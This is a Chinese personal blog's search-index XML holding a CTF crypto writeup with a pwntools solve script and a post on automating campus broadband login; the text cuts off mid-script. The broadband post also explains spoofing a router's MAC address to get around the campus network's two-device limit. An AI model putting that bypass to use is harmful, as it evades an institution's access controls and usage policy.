<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[WP]MoeCTF 2023 writeup</title>
      <link href="/2023/08/15/b23d3edeefb0-q1jun/"/>
      <url>/2023/08/15/b23d3edeefb0-q1jun/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重新输入" data-whm="这些解密的内容无法验证，但您仍然可以查看。">  <script id="hbeData" type="hbeData" data-hmacdigest="257d75fb74e2906e89d4df4a6318de2315fd29883175e8abff08427c4ab70ad0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码来阅读该文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[交互]Crypto-subset writeup.md</title>
      <link href="/2023/08/05/0eb6c02982f0-q1jun/"/>
      <url>/2023/08/05/0eb6c02982f0-q1jun/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h3><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230805170447390.png" alt="111"></p><p>📎subset.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">str</span>(os.getenv(<span class="string">&#x27;FLAG&#x27;</span>)).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">die</span>(<span class="params">*args</span>):</span><br><span class="line">    print_something(*args)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_something</span>(<span class="params">*args</span>):</span><br><span class="line">    s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">    sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>():</span><br><span class="line">    <span class="keyword">return</span> sys.stdin.buffer.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subset_process</span>(<span class="params">n, l, K, A</span>):</span><br><span class="line">    A, K = <span class="built_in">set</span>(A), <span class="built_in">set</span>(K)</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">pow</span>(_, <span class="number">2</span>, n) + randint(<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> A - K]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    border_plus = <span class="string">&quot;[+]&quot;</span></span><br><span class="line">    border_sub = <span class="string">&quot;[-]&quot;</span></span><br><span class="line">    print_something(border_plus, <span class="string">&quot;You need to complete something before I can give you what you ultimately need! Are you ready? &quot;</span>)</span><br><span class="line">    print_something(border_plus, <span class="string">&quot;eg: 1,2,3,4&quot;</span>)</span><br><span class="line">    _flag = <span class="literal">False</span></span><br><span class="line">    n, l = <span class="number">127</span>, <span class="number">20</span></span><br><span class="line">    N = <span class="built_in">set</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(n)))</span><br><span class="line">    K = [randint(<span class="number">0</span>, n-<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    COUNT, STEP = <span class="number">0</span>, <span class="number">2</span> * n // l - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ans = scan().decode().strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _A = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _  <span class="keyword">in</span> ans.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(_A) &lt;= l <span class="keyword">and</span> <span class="built_in">set</span>(_A).issubset(N):</span><br><span class="line">                someting = subset_process(n, l, K, _A)</span><br><span class="line">                print_something(border_plus, <span class="string">f&#x27;someting = <span class="subst">&#123;someting&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">set</span>(_A) == <span class="built_in">set</span>(K):</span><br><span class="line">                    _flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                die(border_sub, <span class="string">&#x27;Exception! Bye!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            die(border_sub, <span class="string">&#x27;Your input is not valid! Bye!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> _flag:</span><br><span class="line">            die(border_plus, <span class="string">f&#x27;Congrats! the flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> COUNT &gt; STEP:</span><br><span class="line">            die(border_sub, <span class="string">&#x27;Too many tries, bye!&#x27;</span>)</span><br><span class="line">        COUNT += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h3><p>题目主要通过<code>K = [randint(0, n-1) for _ in range(l)]</code>生成一个长度为<code>l</code>，元素范围0到(n-1)的set集合，该语句等效以下代码段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">K = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(l): <span class="comment">#循环l次</span></span><br><span class="line">  K.append(randint(<span class="number">0</span>, n-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>最终需要输入一个集合<code>_A</code>使得，才能得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">set</span>(_A) == <span class="built_in">set</span>(K):</span><br><span class="line">_flag = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>而中间可以通过<code>subset_process(n, l, K, A)</code>函数猜测输入的集合<code>_A</code>有哪些元素可能存在于子集<code>K</code>中，一共有11次机会。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">subset_process</span>(<span class="params">n, l, K, A</span>):</span><br><span class="line">    A, K = <span class="built_in">set</span>(A), <span class="built_in">set</span>(K)</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">pow</span>(_, <span class="number">2</span>, n) + randint(<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> A - K]</span><br></pre></td></tr></table></figure><p>每次输入<code>_A</code>之后，输出的内容是<code>_A-K</code>（即不存在于K的元素）的平方<code>随机+1</code>的结果，我们要做的就是还原出<code>_A-K</code>的内容。</p><p>设每次输入后得到的结果为<code>result_list</code>，则可以得到<code>_A-K</code>的元素有哪些，并记录到<code>invalid</code>列表中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">invalid = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_set:</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">pow</span>(i,<span class="number">2</span>,n) <span class="keyword">in</span> result_list:</span><br><span class="line">    invalid.add(i)</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">pow</span>(i,<span class="number">2</span>,n) <span class="keyword">in</span> [b-<span class="number">1</span> <span class="keyword">for</span> b <span class="keyword">in</span> result_list]:</span><br><span class="line">    invalid.add(i)</span><br></pre></td></tr></table></figure><p>然后在输入的集合中将这些剔除掉即可，其中<code>my_set</code>是我们输入的<code>_A</code>集合的元素列表:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_set - invalid:</span><br><span class="line">  current_K.add(i)</span><br></pre></td></tr></table></figure><p>这样我们重复11次，即可求出最终需要的<code>K</code>，请特别注意需要判断输入的合法性。</p><p>使用<strong>python3 + pwntools</strong>完成交互解题脚本的编写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;IP_address&quot;</span>, <span class="number">114514</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">n, l = <span class="number">127</span>, <span class="number">20</span></span><br><span class="line">current_K = <span class="built_in">set</span>()</span><br><span class="line">fullset = <span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    my_set = <span class="built_in">set</span>()</span><br><span class="line">    no_set = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fullset:</span><br><span class="line">        t1 = <span class="built_in">pow</span>(i,<span class="number">2</span>,n)</span><br><span class="line">        t2 = <span class="built_in">pow</span>(i,<span class="number">2</span>,n) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> t1 <span class="keyword">in</span> no_set <span class="keyword">or</span> t2 <span class="keyword">in</span> no_set:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        no_set.add(t1)</span><br><span class="line">        no_set.add(t2)</span><br><span class="line">        my_set.add(i)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(my_set) == l:</span><br><span class="line">            fullset = fullset - my_set</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    r.sendline(<span class="string">&quot;,&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">list</span>(my_set))))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;[+] someting = &quot;</span>)</span><br><span class="line">    result_list = <span class="built_in">eval</span>(r.recvline().decode().strip())</span><br><span class="line"></span><br><span class="line">    invalid = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> my_set:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(i,<span class="number">2</span>,n) <span class="keyword">in</span> result_list:</span><br><span class="line">            invalid.add(i)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(i,<span class="number">2</span>,n) <span class="keyword">in</span> [b-<span class="number">1</span> <span class="keyword">for</span> b <span class="keyword">in</span> result_list]:</span><br><span class="line">            invalid.add(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> my_set - invalid:</span><br><span class="line">        current_K.add(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(current_K) == <span class="number">20</span>:</span><br><span class="line">        r.sendline(<span class="string">&quot;,&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">list</span>(current_K))))</span><br><span class="line">        r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现校园网宽带Web自动认证</title>
      <link href="/2023/06/18/3f8cef62d8f6-q1jun/"/>
      <url>/2023/06/18/3f8cef62d8f6-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    我们学校的宽带在运营商办理之后和教务处账号进行绑定，每次上网插上网线之后需要进入一个认证页面进行登入认证，并且选择对应的运营商。</p><p>​    本来这样挺好的，认证一下嘛也不麻烦。</p><p>​    麻烦的是每次认证是有时效性的，认证之后<code>2880</code>分钟之后自动断网，但是认证并不会消失，需要学生手动点击注销按钮，再重新输入学号和密码进行认证，也就是说每过<strong>2天</strong>(2880min)就准时断网并且需要重新进行上网认证。</p><p>​    现在场景换到你正在和朋友激情打枪，认证的2880分钟到了，突然断网，接下来你要做的是：</p><ul><li>切出浏览器</li><li>进入172.16.2.100认证页面</li><li>点击注销</li><li>输入学号和密码</li><li>选择运营商</li><li>认证成功</li></ul><blockquote><p><del>运营商吃相难看，</del>为了防止一个宿舍只办一条宽带，每个校园网账号只能<code>两台设备上网</code>，本文将提供绕过方法达到不限制设备数量联网</p></blockquote><p>​    现在都3202年了，还在用传统的上网认证吗？</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230618174826845.png" alt="image-20230618174826845"></p><p>接下来我将使用Python进行<code>定时自动认证宽带上网</code>，解决手动认证的烦恼。</p><h2 id="0x02-网络拓扑"><a href="#0x02-网络拓扑" class="headerlink" title="0x02 网络拓扑"></a>0x02 网络拓扑</h2><p>​    鄙人宿舍的网络拓扑结构如下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.jpg" alt="网络拓扑"></p><h2 id="0x03-绕过设备数量限制"><a href="#0x03-绕过设备数量限制" class="headerlink" title="0x03 绕过设备数量限制"></a>0x03 绕过设备数量限制</h2><p>​    一般情况下，当电脑连接校园网宽带认证之后，打开热点让其他设备连接热点，一旦数量超过两个就会自动断网，有时候甚至会被禁用宽带30分钟(<del>十分的恶心</del>)。</p><p>​    细心的同学可能会发现，为什么我开虚拟机不会被识别多个设备联网呢？（当然前提是虚拟机是以Nat方式联网而不是Bridge桥接方式）</p><p>​    <strong>绕过设备限制原理</strong>：这里可以合理猜测校园网的认证系统会对上网设备的MAC进行过滤，而虚拟机的MAC地址较为特殊，是以<code>00:</code>为开头。所以<em>当接入校园网的第一台设备的MAC地址为虚拟机MAC地址</em>时，校园网宽带对设备数量的限制就可以无限制了。</p><p>​    我的无线路由器为<code>红米AX3000</code>支持自定义MAC地址（实际上大部分无线路由器都可以）：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230618185030894.png" alt="image-20230618185030894"></p><p>​    成功达到无限设备数量的效果：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230618185130186.png" alt="image-20230618185130186"></p><p>这里我连了六台设备，均不出现断网断认证的情况，顺利联网。</p><h2 id="0x04-Python脚本实现自动认证"><a href="#0x04-Python脚本实现自动认证" class="headerlink" title="0x04 Python脚本实现自动认证"></a>0x04 Python脚本实现自动认证</h2><p>​    读者朋友可能注意到上方网络拓扑图中有一个连接<code>小交换机</code>的<code>软路由</code>，其实所谓软路由就是有多个网口的小服务器，并且具有一定的路由转发功能。在宿舍我只把软路由当一个旁路由，<code>软路由</code>和其他设备同属一个网段，这样在其他设备中可以直接访问软路由上的服务，比如个人网盘系统、Clash等等。</p><p>​    既然软路由可以24小时不间断运行，那只需要把自动认证的脚本丢进这个软路由，让它在某个<strong>不活跃</strong>(比如睡觉时候)，进行<code>注销-登录-认证</code>的过程，这样就再也不需要自己进行手动认证这个校园网宽带了，也不怕打游戏打着打着断网了。</p><p>​    我的软路由里面装有Ubuntu Linux系统：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230618185945948.png" alt="image-20230618185945948"></p><p>为了防止终端关闭导致Python脚本停止执行，这里使用<code>screen</code>进行后台运行脚本，安装方法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install screen</span><br></pre></td></tr></table></figure><p>如果你是redhat系的Linux发行版则是以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install screen</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install screen</span><br></pre></td></tr></table></figure><p>如果你是macos：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo brew install screen</span><br></pre></td></tr></table></figure><p>Windows（略。</p><p>Python脚本如下：</p><p><a target="_blank" rel="noopener" href="https://github.com/q1jun/ecjtu_AC_network/blob/master/byRequests.py">ecjtu_AC_network&#x2F;byRequests.py at master · q1jun&#x2F;ecjtu_AC_network (github.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IdAndPasswd</span>():</span><br><span class="line">    ispList = [<span class="string">&quot;@cmcc&quot;</span>, <span class="string">&quot;@unicom&quot;</span>, <span class="string">&quot;@telecom&quot;</span>]</span><br><span class="line">    osList = [<span class="string">&quot;win&quot;</span>, <span class="string">&quot;linux&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/var/www/ecjtu_AC_network/.logindata.data&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            info = [a.rstrip(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span> a <span class="keyword">in</span> f]</span><br><span class="line">        <span class="keyword">if</span> info.__len__() &lt; <span class="number">4</span>:</span><br><span class="line">            os.remove(<span class="string">&quot;/var/www/ecjtu_AC_network/.logindata.data&quot;</span>)</span><br><span class="line">            info.extend((<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;输入学号：&quot;</span>)), <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;输入密码：&quot;</span>))))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;1:中国移动  2:中国联通  3:中国电信&quot;</span>)</span><br><span class="line">            number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;选择运营商(1-3)：&quot;</span>))</span><br><span class="line">            info.append(ispList[number - <span class="number">1</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;1:Windows  2:Linux(Macos)&quot;</span>)</span><br><span class="line">            number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;选择操作系统(1-2)：&quot;</span>))</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/var/www/ecjtu_AC_network/.logindata.data&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                info.append(osList[number - <span class="number">1</span>])</span><br><span class="line">                f.write(<span class="string">&quot;\n&quot;</span>.join(info))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        info = [<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;输入学号：&quot;</span>))]</span><br><span class="line">        info.append(<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;输入密码：&quot;</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1:中国移动  2:中国联通  3:中国电信&quot;</span>)</span><br><span class="line">        number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;选择运营商(1-3)：&quot;</span>))</span><br><span class="line">        info.append(ispList[number - <span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1:Windows  2:Linux(Macos)&quot;</span>)</span><br><span class="line">        number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;选择操作系统(1-2)：&quot;</span>))</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;/var/www/ecjtu_AC_network/.logindata.data&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        info.append(osList[number - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/var/www/ecjtu_AC_network/.logindata.data&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&quot;\n&quot;</span>.join(info))</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetIp</span>():</span><br><span class="line">    HOST = <span class="string">&quot;http://172.16.2.100/&quot;</span></span><br><span class="line">    r = requests.get(HOST)</span><br><span class="line">    bsobj = BeautifulSoup(r.content, <span class="string">&#x27;html5lib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">r&quot;ss5=\&quot;(.+?)\&quot;&quot;</span>, <span class="built_in">str</span>(bsobj))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TestLog</span>(<span class="params">requestObj</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;************** test log start *******************&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Status Code: &quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(requestObj.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Url: &quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(requestObj.url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Headers: &quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(requestObj.headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cookies: &quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(requestObj.cookies)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;History: &quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(requestObj.history)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------- 